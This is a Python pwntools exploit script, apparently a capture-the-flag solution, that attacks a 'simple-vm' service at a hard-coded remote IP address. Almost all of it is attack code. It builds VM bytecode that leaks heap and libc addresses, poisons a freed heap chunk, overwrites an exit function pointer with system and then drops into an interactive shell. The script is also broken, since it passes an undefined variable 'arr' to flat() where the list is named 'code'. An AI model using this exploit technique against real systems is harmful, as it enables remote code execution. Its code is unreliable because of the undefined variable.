#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
from struct import pack


context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86-64'
context.os = 'linux'
context.log_level = 'DEBUG'

EXEC = 0x0000555555554000

#io = process("./simple-vm")
io = remote("111.231.19.153", 20003)

#gdb.attach(io, execute='b *0x%x' % (EXEC+0x000000000000175B))
#gdb.attach(io, execute='b *0x%x' % (EXEC+0x000000000000157D)) # call
#gdb.attach(io, execute='b *0x%x' % (EXEC+0x0000000000001900)) # debug

store_string = lambda reg, leng, s: pack("<bbH", 0x30, reg, leng)+s
store_int = lambda reg, val: pack("<bbH", 0x01, reg, val)
add = lambda dst, src1, src2: pack("<bbbb", 0x21, dst, src1, src2)
sub = lambda dst, src1, src2: pack("<bbbb", 0x22, dst, src1, src2)
mul = lambda dst, src1, src2: pack("<bbbb", 0x23, dst, src1, src2)
div = lambda dst, src1, src2: pack("<bbbb", 0x24, dst, src1, src2)
peek = lambda reg, addr: pack("<bbb", 0x60, reg, addr)
poke = lambda reg, addr: pack("<bbb", 0x61, reg, addr)
inc = lambda reg: pack("<bb", 0x25, reg)
dec = lambda reg: pack("<bb", 0x26, reg)
concat = lambda dst, src1, src2: pack("<bbbb", 0x32, dst, src1, src2)
debug = lambda : '\x0a'
exit = lambda : '\x00'

'''
#0 addr
#1 libc_hi
#2 libc_lo
#5 reserved
#7 heap_lo
#9 0x81

将free chunk的fd改为reg9的地方，修改exit的函数指针为system
'''

# stage0 
payload  = ''

code = [
    store_string(0x0, 0x20, "A"*0x20),
    store_string(0x1, 0x20, "A"*0x20),
    store_string(0x4, 0xa0, "A"*0xa0),
    store_string(0x5, 0xa0, "A"*0xa0),
    store_int(0x4, 0xffff), # (free 1)

    # stage1 mov (int)heap to #7
    store_int(0x1, 0xffff), # (free 1)
    store_int(0x0, 0x14), # (free 0)
    add(0x0, 0x0, 0x1),
    store_int(0x8, 0x100), # (free 1)

    [
        peek(0x6, 0x0),
        mul(0x7, 0x7, 0x8),
        add(0x7, 0x7, 0x6),
        dec(0x0)
    ]*4,

    # stage2 mov (int)heap to #9
    store_int(0x1, 0xffff),
    store_int(0x0, 0x78),
    add(0x0, 0x0, 0x1),
    store_int(0x8, 0x100),

    [
        peek(0x6, 0x0),
        mul(0x1, 0x1, 0x8),
        add(0x1, 0x1, 0x6),
        dec(0x0)
    ]*4,

    [
        peek(0x6, 0x0),
        mul(0x2, 0x2, 0x8),
        add(0x2, 0x2, 0x6),
        dec(0x0)
    ]*4,

    # stage 3
    store_int(0x3, 0xffff),
    store_int(0x0, 0x11),
    add(0x0, 0x0, 0x3),
    store_int(0x9, 0xffff),
    store_int(0x8, 0x1891),
    add(0x8, 0x8, 0x9),
    sub(0x7, 0x7, 0x8),
    store_int(0x8, 0x100),

    [
        poke(0x7, 0x0),
        div(0x7, 0x7, 0x8),
        inc(0x0),
    ]*4,


    # stage4 overwrite fp
    store_int(0x8, 0x0),

    [
        store_int(0x9, 0xffff),
        add(0x8, 0x8, 0x9),
    ]*0x37,

    store_int(0x9, 0xf81f),
    add(0x8, 0x8, 0x9),
    sub(0x2, 0x2, 0x8), # calculate system address
    store_int(0x3, 0xffff),
    store_int(0x0, 0x121),
    add(0x0, 0x0, 0x3),
    store_int(0x8, 0x100),

    [
        poke(0x2, 0x0),
        div(0x2, 0x2, 0x8),
        inc(0x0)
    ]*4,


    [
        poke(0x1, 0x0),
        div(0x1, 0x1, 0x8),
        inc(0x0)
    ]*4,

    store_int(0x9, 0x31),
    store_string(0x7, 0x18, "A"*0x18),
    debug(),
    concat(0x8, 0x7, 0x5),
    pack("<bb", 0x01, 0x0)+'sh',    # store-int #0, 0x51 (free 0)

    #stage5 trigger
    exit()
]

payload = flat(arr)

io.recvuntil("size")
io.sendline(str(len(payload)))

io.send(payload)

io.interactive()
